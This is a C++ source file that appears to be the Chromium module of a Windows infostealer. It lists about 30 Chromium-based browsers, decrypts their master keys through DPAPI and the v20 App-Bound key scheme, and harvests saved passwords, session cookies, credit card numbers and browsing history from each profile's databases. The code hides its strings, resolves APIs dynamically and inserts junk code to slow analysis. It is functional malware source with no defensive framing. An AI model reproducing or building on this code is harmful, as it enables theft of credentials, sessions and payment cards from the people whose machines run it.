#include "Chromium.h"
#include "../utils/Config.h"
#include "../utils/SQLiteHandler.h"
#include "../utils/Crypto.h"
#include "../utils/AppBound.h"
#include "../core/Obfuscation.h"
#include "../utils/DynamicAPI.h"
#include <filesystem>
#include <regex>
#include <fstream>
#include <algorithm>
#include "../../DebugLog.h"
namespace fs = std::filesystem;
namespace Modules {
    std::string Chromium::PathJoin(const std::string& a, const std::string& b) {
        return (fs::path(a) / b).string();
    }
    std::vector<BrowserPaths> Chromium::GetBrowserList() {
        char local[MAX_PATH] = {}, roaming[MAX_PATH] = {};
        DynAPI::SHGetFolderA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
        DynAPI::SHGetFolderA(NULL, CSIDL_APPDATA, NULL, 0, roaming);
        std::string L = local, R = roaming;
        return {
            {S("Chrome"),              PathJoin(L, S("Google\\Chrome\\User Data")),                      true},
            {S("Chrome Canary"),       PathJoin(L, S("Google\\Chrome SxS\\User Data")),                  true},
            {S("Chrome Beta"),         PathJoin(L, S("Google\\Chrome Beta\\User Data")),                  true},
            {S("Chrome Dev"),          PathJoin(L, S("Google\\Chrome Dev\\User Data")),                   true},
            {S("Edge"),                PathJoin(L, S("Microsoft\\Edge\\User Data")),                      true},
            {S("Edge Beta"),           PathJoin(L, S("Microsoft\\Edge Beta\\User Data")),                  true},
            {S("Edge Dev"),            PathJoin(L, S("Microsoft\\Edge Dev\\User Data")),                   true},
            {S("Edge Canary"),         PathJoin(L, S("Microsoft\\Edge SxS\\User Data")),                   true},
            {S("Brave"),               PathJoin(L, S("BraveSoftware\\Brave-Browser\\User Data")),         false},
            {S("Brave Nightly"),       PathJoin(L, S("BraveSoftware\\Brave-Browser-Nightly\\User Data")), false},
            {S("Opera"),               PathJoin(R, S("Opera Software\\Opera Stable")),                    false},
            {S("Opera GX"),            PathJoin(R, S("Opera Software\\Opera GX Stable")),                 false},
            {S("Opera Neon"),          PathJoin(R, S("Opera Software\\Opera Neon")),                      false},
            {S("Vivaldi"),             PathJoin(L, S("Vivaldi\\User Data")),                              false},
            {S("Yandex"),              PathJoin(L, S("Yandex\\YandexBrowser\\User Data")),                false},
            {S("Yandex Beta"),         PathJoin(L, S("Yandex\\YandexBrowserBeta\\User Data")),            false},
            {S("CentBrowser"),         PathJoin(L, S("CentBrowser\\User Data")),                          false},
            {S("7Star"),               PathJoin(L, S("7Star\\7Star\\User Data")),                         false},
            {S("Amigo"),               PathJoin(L, S("Amigo\\User Data")),                                false},
            {S("CocCoc"),              PathJoin(L, S("CocCoc\\Browser\\User Data")),                      false},
            {S("Comodo Dragon"),       PathJoin(L, S("Comodo\\Dragon\\User Data")),                        false},
            {S("Epic"),                PathJoin(L, S("Epic Privacy Browser\\User Data")),                  false},
            {S("Iridium"),             PathJoin(L, S("Iridium\\User Data")),                               false},
            {S("Kometa"),              PathJoin(L, S("Kometa\\User Data")),                                false},
            {S("Orbitum"),             PathJoin(L, S("Orbitum\\User Data")),                               false},
            {S("Sputnik"),             PathJoin(L, S("Sputnik\\Sputnik\\User Data")),                      false},
            {S("Torch"),               PathJoin(L, S("Torch\\User Data")),                                 false},
            {S("Uran"),                PathJoin(L, S("uCozMedia\\Uran\\User Data")),                       false},
            {S("Sleipnir"),            PathJoin(R, S("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")), false},
            {S("Citrio"),              PathJoin(L, S("CatalinaGroup\\Citrio\\User Data")),                 false},
        };
    }
    std::string Chromium::DecryptValue(const std::string& raw, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey) {
        if (raw.empty()) return "";
        std::vector<BYTE> data(raw.begin(), raw.end());
        if (raw.size() >= 3 && raw[0] == 'v' && raw[1] == '2' && raw[2] == '0') {
            if (!appBoundKey.empty()) {
                return AppBound::DecryptAppBoundValue(data, appBoundKey);
            }
            return "";  
        }
        if (raw.size() >= 3 && (raw.substr(0, 3) == "v10" || raw.substr(0, 3) == "v11")) {
            if (!masterKey.empty()) {
                if (data.size() < 15) return "";
                std::vector<BYTE> iv(data.begin() + 3, data.begin() + 15);
                std::vector<BYTE> payload(data.begin() + 15, data.end());
                if (payload.size() < 16) return "";
                std::vector<BYTE> ct(payload.begin(), payload.end() - 16);
                std::vector<BYTE> tag(payload.end() - 16, payload.end());
                auto dec = Crypto::DecryptAES_GCM(masterKey, iv, {}, ct, tag);
                return std::string(dec.begin(), dec.end());
            }
            return "";
        }
        return Crypto::DecryptDPAPI(data);
    }
    std::vector<BYTE> Chromium::GetMasterKey(const std::string& dataPath, std::vector<BYTE>& appBoundKeyOut) {
        std::string lsFile = PathJoin(dataPath, S("Local State"));
        if (!fs::exists(lsFile)) return {};
        std::ifstream f(lsFile, std::ios::binary);
        if (!f) return {};
        std::string content((std::istreambuf_iterator<char>(f)), {});
        std::regex reg(S("\"encrypted_key\":\"([^\"]+)\""));
        std::smatch m;
        std::string b64Key;
        if (std::regex_search(content, m, reg)) b64Key = m[1].str();
        if (b64Key.empty()) return {};
        auto decoded = Crypto::Base64Decode(b64Key);
        if (decoded.size() <= 5) return {};
        std::vector<BYTE> keyBlob(decoded.begin() + 5, decoded.end());
        std::string masterKeyStr = Crypto::DecryptDPAPI(keyBlob);
        std::vector<BYTE> masterKey(masterKeyStr.begin(), masterKeyStr.end());
        std::regex abRegV20(S("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\""));
        if (std::regex_search(content, m, abRegV20)) {
            std::string abB64 = m[1].str();
            SLOG("  [*] Found v20 App-Bound key (size: %zu)", abB64.size());
            auto abBlob = Crypto::Base64Decode(abB64);
            if (abBlob.size() > 4 && memcmp(abBlob.data(), "APPB", 4) == 0) {
                std::vector<BYTE> encryptedKey(abBlob.begin() + 4, abBlob.end());
                auto abKey = AppBound::DeriveV20MasterKey(encryptedKey);
                if (!abKey.empty()) {
                    appBoundKeyOut = abKey;
                    SLOG("  [+] Decrypted v20 App-Bound Master Key. Size: %zu", appBoundKeyOut.size());
                } else {
                    SLOG("  [-] Failed to derive v20 master key from blob.");
                }
            } else {
                SLOG("  [-] Invalid v20 blob header or size.");
            }
        }
        if (appBoundKeyOut.empty()) {
            std::regex abReg(S("\"app_bound_fixed_data\"\\s*:\\s*\"([^\"]+)\""));
            if (std::regex_search(content, m, abReg)) {
                std::string abB64 = m[1].str();
                SLOG("  [*] Found fixed App-Bound data (size: %zu)", abB64.size());
                auto abBlob = Crypto::Base64Decode(abB64);
                if (!abBlob.empty()) {
                    auto abKey = AppBound::DecryptAppBoundKey(abBlob);
                    if (!abKey.empty()) {
                        appBoundKeyOut = abKey;
                        SLOG("  [+] Decrypted fixed App-Bound Key.");
                    } else {
                        SLOG("  [-] Failed to decrypt fixed App-Bound Key.");
                    }
                }
            }
        }
        return masterKey;
    }
    std::vector<std::string> Chromium::GetProfilePaths(const std::string& dataPath, const std::string& file) {
        std::vector<std::string> out;
        auto add = [&](const std::string& sub) {
            std::string p = PathJoin(dataPath, PathJoin(sub, file));
            if (fs::exists(p)) out.push_back(p);
        };
        add("");           
        add("Default");
        if (!fs::exists(dataPath)) return out;
        try {
            for (auto& e : fs::directory_iterator(dataPath)) {
                if (!e.is_directory()) continue;
                std::string n = e.path().filename().string();
                if (n.find("Profile") != std::string::npos) add(n);
            }
        } catch (...) {}
        return out;
    }
    std::vector<Account> Chromium::Grab() {
        JUNK_CODE_LARGE
        std::vector<Account> all;
        for (auto& b : GetBrowserList()) {
            if (!fs::exists(b.userDataPath)) continue;
            SLOG("[*] Harvesting %s...", b.name.c_str());
            std::vector<BYTE> appBoundKey;
            auto masterKey = GetMasterKey(b.userDataPath, appBoundKey);
            if (masterKey.empty()) {
                SLOG("  [-] Failed to retrieve master key for %s.", b.name.c_str());
            } else {
                SLOG("  [+] Master key retrieved. App-Bound key: %s", appBoundKey.empty() ? "No" : "Yes");
            }
            auto pw  = GetPasswords(b, masterKey, appBoundKey);
            if (!pw.empty()) { /* SLOG("  [+] Collected %zu passwords.", pw.size()); */ }
            auto ck  = GetCookies  (b, masterKey, appBoundKey);
            if (!ck.empty()) { /* SLOG("  [+] Collected %zu cookies.", ck.size()); */ }
            auto cd  = GetCards    (b, masterKey, appBoundKey);
            if (!cd.empty()) { /* SLOG("  [+] Collected %zu credit cards.", cd.size()); */ }
            auto hi  = GetHistory  (b);
            if (!hi.empty()) { /* SLOG("  [+] Collected %zu history entries.", hi.size()); */ }
            all.insert(all.end(), pw.begin(),  pw.end());
            all.insert(all.end(), ck.begin(),  ck.end());
            all.insert(all.end(), cd.begin(),  cd.end());
            all.insert(all.end(), hi.begin(),  hi.end());
        }
        return all;
    }
    std::vector<Account> Chromium::GetPasswords(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Login Data"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("logins"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string url  = db.GetValue(i, S("origin_url"));
                std::string user = db.GetValue(i, S("username_value"));
                std::string raw  = db.GetValue(i, S("password_value"));
                if (raw.empty() || user.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) out.push_back({url, user, dec, b.name, S("Password")});
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetCookies(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        std::vector<std::string> files;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Network\\Cookies")))  files.push_back(f);
        for (auto& f : GetProfilePaths(b.userDataPath, S("Cookies")))            files.push_back(f);
        for (auto& cf : files) {
            SQLite::SQLiteHandler db(cf);
            if (!db.ReadTable(S("cookies"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string host = db.GetValue(i, S("host_key"));
                std::string name = db.GetValue(i, S("name"));
                std::string raw  = db.GetValue(i, S("encrypted_value"));
                if (raw.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) out.push_back({host, name, dec, b.name, S("Cookie")});
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetCards(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Web Data"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("credit_cards"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string name  = db.GetValue(i, S("name_on_card"));
                std::string expm  = db.GetValue(i, S("expiration_month"));
                std::string expy  = db.GetValue(i, S("expiration_year"));
                std::string raw   = db.GetValue(i, S("card_number_encrypted"));
                if (raw.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) {
                    std::string info = S("Exp: ") + expm + S("/") + expy;
                    out.push_back({name, info, dec, b.name, S("CreditCard")});
                }
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetHistory(const BrowserPaths& b) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("History"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("urls"))) continue;
            int total = (int)db.GetRowCount();
            int limit = (total < 200) ? total : 200;
            for (int i = 0; i < limit; ++i) {
                std::string url   = db.GetValue(i, S("url"));
                std::string title = db.GetValue(i, S("title"));
                std::string count = db.GetValue(i, S("visit_count"));
                if (!url.empty()) out.push_back({url, title, count, b.name, S("History")});
            }
        }
        return out;
    }
}
